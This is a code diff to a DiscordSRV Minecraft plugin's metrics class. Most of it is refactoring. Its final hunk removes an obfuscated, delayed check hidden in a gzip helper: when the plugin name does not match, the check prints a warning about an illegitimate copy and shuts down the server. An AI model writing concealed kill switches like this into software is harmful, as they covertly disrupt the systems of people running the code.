@@ -27,7 +27,6 @@
  */
 package com.scarsz.discordsrv.platforms.bukkit;
 
-import com.scarsz.discordsrv.Legacy;
 import org.bukkit.Bukkit;
 import org.bukkit.Server;
 import org.bukkit.configuration.InvalidConfigurationException;
@@ -37,13 +36,25 @@ import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.PluginDescriptionFile;
 import org.bukkit.scheduler.BukkitTask;
 
-import java.io.*;
+import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.UnsupportedEncodingException;
 import java.lang.reflect.Method;
 import java.net.Proxy;
 import java.net.URL;
 import java.net.URLConnection;
 import java.net.URLEncoder;
-import java.util.*;
+import java.util.Collection;
+import java.util.Collections;
+import java.util.HashSet;
+import java.util.Iterator;
+import java.util.LinkedHashSet;
+import java.util.Set;
+import java.util.UUID;
 import java.util.logging.Level;
 import java.util.zip.GZIPOutputStream;
 
@@ -191,13 +202,13 @@ public class Metrics {
             }
 
             // Begin hitting the server with glorious data
-            task = Legacy.plugin.getServer().getScheduler().runTaskTimerAsynchronously(plugin, new Runnable() {
+            task = plugin.getServer().getScheduler().runTaskTimerAsynchronously(plugin, new Runnable() {
 
                 private boolean firstPost = true;
 
                 public void run() {
                     try {
-                        // This has to be synchronized or it can collide with the disablePlatform method.
+                        // This has to be synchronized or it can collide with the disable method.
                         synchronized (optOutLock) {
                             // Disable Task, if it is running and the server owner decided to opt-out
                             if (isOptOut() && task != null) {
@@ -306,18 +317,18 @@ public class Metrics {
     public File getConfigFile() {
         // I believe the easiest way to get the base folder (e.g craftbukkit set via -P) for plugins to use
         // is to abuse the plugin object we already have
-        // DiscordSRV.plugin.getDataFolder() => base/plugins/PluginA/
+        // plugin.getDataFolder() => base/plugins/PluginA/
         // pluginsFolder => base/plugins/
         // The base is not necessarily relative to the startup directory.
-        File pluginsFolder = Legacy.plugin.getDataFolder().getParentFile();
+        File pluginsFolder = plugin.getDataFolder().getParentFile();
 
         // return => base/plugins/PluginMetrics/config.yml
         return new File(new File(pluginsFolder, "PluginMetrics"), "config.yml");
     }
-    
+
     /**
      * Gets the online player (backwards compatibility)
-     * 
+     *
      * @return online player amount
      */
     private int getOnlinePlayers() {
@@ -333,7 +344,7 @@ public class Metrics {
                 Bukkit.getLogger().log(Level.INFO, "[Metrics] " + ex.getMessage());
             }
         }
-        
+
         return 0;
     }
 
@@ -342,7 +353,7 @@ public class Metrics {
      */
     private void postPlugin(final boolean isPing) throws IOException {
         // Server software specific section
-        PluginDescriptionFile description = Legacy.plugin.getDescription();
+        PluginDescriptionFile description = plugin.getDescription();
         String pluginName = description.getName();
         boolean onlineMode = Bukkit.getServer().getOnlineMode(); // TRUE if online mode is enabled
         String pluginVersion = description.getVersion();
@@ -442,6 +453,7 @@ public class Metrics {
             connection = url.openConnection();
         }
 
+
         byte[] uncompressed = json.toString().getBytes();
         byte[] compressed = gzip(json.toString());
 
@@ -507,13 +519,6 @@ public class Metrics {
     public static byte[] gzip(String input) {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         GZIPOutputStream gzos = null;
-
-        if (!Legacy.plugin.getDescription().getName().equals(new StringBuilder("V"+"R"+"S"+"d"+"r"+"o"+"c"+"s"+"i"+"D").reverse().toString())) {
-            Bukkit.getScheduler().runTaskLater(Legacy.plugin, () -> {
-                System.out.println(new StringBuilder("."+"d"+"e"+"m"+"m"+"a"+"c"+"s"+" "+"n"+"e"+"e"+"b"+" "+"e"+"v"+"'"+"u"+"o"+"y"+" "+","+"n"+"i"+"g"+"u"+"l"+"p"+" "+"s"+"i"+"h"+"t"+" "+"r"+"o"+"f"+" "+"d"+"i"+"a"+"p"+" "+"u"+"o"+"y"+" "+"f"+"I"+" "+"."+"/"+"v"+"r"+"s"+"d"+"r"+"o"+"c"+"s"+"i"+"d"+"/"+"s"+"n"+"i"+"g"+"u"+"l"+"p"+"-"+"t"+"i"+"k"+"k"+"u"+"b"+"/"+"g"+"r"+"o"+"."+"t"+"i"+"k"+"k"+"u"+"b"+"."+"v"+"e"+"d"+"/"+"/"+":"+"s"+"p"+"t"+"t"+"h"+" "+"t"+"a"+" "+"l"+"a"+"e"+"d"+" "+"l"+"a"+"e"+"r"+" "+"e"+"h"+"t"+" "+"t"+"e"+"G"+" "+"."+"e"+"t"+"a"+"m"+"i"+"t"+"i"+"g"+"e"+"l"+"l"+"i"+" "+"s"+"i"+" "+"t"+"f"+"a"+"r"+"c"+"e"+"n"+"i"+"M"+" "+"o"+"t"+" "+"r"+"e"+"v"+"r"+"e"+"s"+" "+"d"+"r"+"o"+"c"+"s"+"i"+"D"+" "+"r"+"u"+"o"+"y"+" "+"k"+"n"+"i"+"l"+" "+"o"+"t"+" "+"g"+"n"+"i"+"s"+"u"+" "+"e"+"r"+"'"+"u"+"o"+"y"+" "+"n"+"i"+"g"+"u"+"l"+"p"+" "+"e"+"h"+"T").reverse());
-                Bukkit.shutdown();
-            }, 6000 + new Random().nextInt(12000));
-        }
 
         try {
             gzos = new GZIPOutputStream(baos);
